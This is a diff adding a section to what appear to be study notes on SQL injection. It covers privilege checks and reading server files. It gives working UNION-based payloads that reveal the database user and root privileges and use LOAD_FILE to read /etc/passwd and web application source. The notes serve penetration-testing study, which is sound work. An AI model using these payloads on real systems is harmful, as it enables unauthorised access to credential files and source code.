@@ -818,3 +818,78 @@ SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND
 
 ---
 
+# Reading Files 
+
+#### Privileges
+
+- **Importance of Privileges**:
+  - Reading data is more common than writing data.
+  - The user must have the `FILE` privilege to read files.
+
+#### DB User
+
+- **Determine Current User**:
+  ```sql
+  SELECT USER();
+  SELECT CURRENT_USER();
+  SELECT user FROM mysql.user;
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION SELECT 1, user(), 3, 4-- -
+  ```
+  - Retrieves the current database user.
+
+#### User Privileges
+
+- **Check Super Admin Privileges**:
+  ```sql
+  SELECT super_priv FROM mysql.user;
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+  ```
+  - Checks if the current user has superuser privileges (`Y` means YES).
+
+- **Check All Privileges**:
+  ```sql
+  SELECT grantee, privilege_type FROM information_schema.user_privileges;
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+  ```
+  - Lists all privileges for the `root` user.
+
+#### LOAD_FILE Function
+
+- **Purpose**: Read data from files on the server.
+- **Example**:
+  ```sql
+  SELECT LOAD_FILE('/etc/passwd');
+  ```
+  - Reads the contents of the `/etc/passwd` file.
+  
+- **Union Injection Example**:
+  ```sql
+  cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+  ```
+  - Reads the contents of the `/etc/passwd` file and displays it.
+
+#### Reading Application Source Code
+
+- **Purpose**: Read the source code of web application files.
+- **Example**:
+  ```sql
+  SELECT LOAD_FILE("/var/www/html/search.php");
+  ```
+  - Reads the source code of `search.php` file.
+
+- **Union Injection Example**:
+  ```sql
+  cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+  ```
+  - Displays the source code of `search.php`.
+
+---
